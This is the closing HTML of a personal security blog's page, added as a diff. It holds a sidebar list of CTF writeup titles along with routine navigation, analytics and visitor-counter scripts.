+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2018/01/26/hitcon2017-Baby-H-master-php-2017-复现/" title="下一篇: [hitcon2017] Baby^H-master-php-2017 复现">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/07/06/hello-world/">Hello World</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/01/题目-记一次利用gopher的内网mysql盲注/">[题目]记一次利用gopher的内网mysql盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/03/hitctf-Web-Writeup/">[hitctf] Web Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/26/hitcon2017-Baby-H-master-php-2017-复现/">[hitcon2017] Baby^H-master-php-2017 复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/14/hitcon2017-SSRF-Me复现/">[hitcon2017] SSRF Me复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/08/hitcon2017-Sql-so-hard-复现/">[hitcon2017] Sql-so-hard 复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/23/2017-X-NUCA-总决赛小结/">[2017 X-NUCA]总决赛小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/27/hitcon2017-BabyFirst-Revenge-V2复现/">[hitcon2017] BabyFirst Revenge V2复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/26/hitcon2017-BabyFirst-Revenge复现/">[hitcon2017] BabyFirst Revenge复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/08/Web狗要懂的Padding-Oracle攻击/">Web狗要懂的Padding Oracle攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/24/Web狗要懂的CBC翻转字节攻击-Flipped-Ciphertext-Bits/">Web狗要懂的CBC翻转字节攻击(Flipped Ciphertext Bits)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/10/2017世安杯-决赛Writeup/">[2017世安杯] 决赛Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/09/2017世安杯-初赛Web-Writeup/">[2017世安杯] 初赛Web Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/2017强网杯-线下总结/">[2017强网杯] 线下总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/19/2017WHCTF-Web详细复现-伪-WP/">[2017WHCTF] Web详细复现(伪)WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/11/2017强网杯-Web-Writeup/">[2017强网杯] Web Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/15/XMAN-线下赛总结/">[XMAN] 线下赛总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/14/2017X-nuca-赛前热身Writeup/">[2017X-nuca] 赛前热身Writeup</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2019 Pr0ph3t
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-87275583-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
